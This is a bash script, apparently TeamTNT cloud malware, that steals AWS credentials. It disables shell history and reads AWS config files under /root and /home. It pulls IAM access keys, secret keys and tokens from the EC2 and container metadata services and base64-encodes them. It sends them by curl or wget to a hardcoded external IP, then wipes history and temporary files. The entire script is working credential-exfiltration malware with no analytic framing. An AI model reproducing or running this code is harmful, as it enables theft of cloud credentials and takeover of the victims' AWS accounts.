#!/bin/bash

export LC_ALL=C

HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}"
export HISTFILE=/dev/null 
unset HISTFILE
HISTSIZE=0

export HOMECALL="http://45.9.148.85"
export SEND_URL="http://45.9.148.85/Ya-wer/get"

ROOTAWSFILES=`cat /root/.aws/* 2>/dev/null`
USERAWSFILES=`cat /home/*/.aws/* 2>/dev/null`

if type wget >/dev/null ; then DLOAD="timeout -s SIGKILL 30 wget -q --no-check-certificate -O -"
elif type curl >/dev/null ; then DLOAD="timeout -s SIGKILL 30 curl -s -Lk" ; fi


ACCOUNT_ID=`$DLOAD http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | grep 'AccountId' | awk  '{print $3}' | sed 's/"//g'`
DEFAULT_REGION=`$DLOAD http://169.254.169.254/latest/meta-data/placement/availability-zone`
ACCOUNT_PROFIL=`$DLOAD http://169.254.169.254/latest/meta-data/iam/info | grep 'InstanceProfileArn' | awk '{print $3}' | sed 's/",//g' | sed 's/"//g'`
AXX_PROFIL=${ACCOUNT_PROFIL#*/}
    IAM_SECROLE=`$DLOAD http://169.254.169.254/latest/meta-data/iam/security-credentials/`
    IAM_SECCRED=`$DLOAD http://169.254.169.254/latest/meta-data/iam/security-credentials/${IAM_SECROLE}`
        ACCESSKEYID=`$DLOAD http://169.254.169.254/latest/meta-data/iam/security-credentials/${IAM_SECROLE} | grep 'AccessKeyId' | awk  '{print $3}' | sed 's/"//g' | sed 's/,//g'`
        SECRET_AKEY=`$DLOAD http://169.254.169.254/latest/meta-data/iam/security-credentials/${IAM_SECROLE} | grep 'SecretAccessKey' | awk  '{print $3}' | sed 's/"//g' | sed 's/,//g'`
        SECUR_TOKEN=`$DLOAD http://169.254.169.254/latest/meta-data/iam/security-credentials/${IAM_SECROLE} | grep 'Token' | awk  '{print $3}' | sed 's/"//g' | sed 's/,//g'`
            if ! [ -z "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ] ; then AWS_CONTAINER=`$DLOAD http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` ; fi
				export RIP=`$DLOAD 136.144.56.255`


chattr -ia / /tmp/ 2>/dev/null ; mchattr -ia / /tmp/ 2>/dev/null
echo 'Account ID: '$ACCOUNT_ID > /tmp/.stolen.from.teamtnt
echo 'def region: '$DEFAULT_REGION >> /tmp/.stolen.from.teamtnt
echo 'Axx Profil: '$AXX_PROFIL >> /tmp/.stolen.from.teamtnt
echo '' >> /tmp/.stolen.from.teamtnt ; echo '' >> /tmp/.stolen.from.teamtnt
echo 'root aws files: '$ROOTAWSFILES >> /tmp/.stolen.from.teamtnt
echo '' >> /tmp/.stolen.from.teamtnt
echo 'user aws files: '$USERAWSFILES >> /tmp/.stolen.from.teamtnt
echo '' >> /tmp/.stolen.from.teamtnt ; echo '' >> /tmp/.stolen.from.teamtnt
echo 'AccessKeyId: '$ACCESSKEYID >> /tmp/.stolen.from.teamtnt
echo 'SecretAccessKey: '$SECRET_AKEY >> /tmp/.stolen.from.teamtnt
echo 'Token: '$SECUR_TOKEN >> /tmp/.stolen.from.teamtnt
echo '' >> /tmp/.stolen.from.teamtnt ; echo '' >> /tmp/.stolen.from.teamtnt
echo 'AWS Container: '$AWS_CONTAINER >> /tmp/.stolen.from.teamtnt
echo '' >> /tmp/.stolen.from.teamtnt ; echo '' >> /tmp/.stolen.from.teamtnt
history -c
clear
echo ''
echo ''
echo ''
TC_LINK=`echo 'python3 scout.py aws --access-keys --access-key-id $ACCESSKEYID --secret-access-key $SECRET_AKEY --session-token $SECUR_TOKEN -r $DEFAULT_REGION' | base64 -w 0`

if type curl 2>/dev/null 1>/dev/null; then timeout -s SIGKILL 120 curl -sLk -o /dev/null $HOMECALL/r.php?tcurl=$TC_LINK
elif type curl 2>/dev/null 1>/dev/null; then timeout -s SIGKILL 120 wget -q --no-check-certificate -O /dev/null $HOMECALL/r.php?tcurl=$TC_LINK; fi

echo ''
echo ''
echo ''


DATATOSEND=$(< /tmp/.stolen.from.teamtnt)
echo -e "$DATATOSEND"
rm -f /tmp/.stolen.from.teamtnt

if ! [ -f "/dev/shm/.TNT.lock" ] ; then
touch /dev/shm/.TNT.lock
chattr +i /dev/shm/.TNT.lock 2>/dev/null ; mchattr +i /dev/shm/.TNT.lock 2>/dev/null
B64DATA=`echo $DATATOSEND | base64 -w 0`

timeout -s SIGKILL 120 wget  --no-check-certificate -q -O /dev/null "http://45.9.148.85/Ya-wer/get/aws.php?rip=$RIP&data=$B64DATA"

else
echo 'dont upload a second logfile!'
history -c
fi
history -c
exit


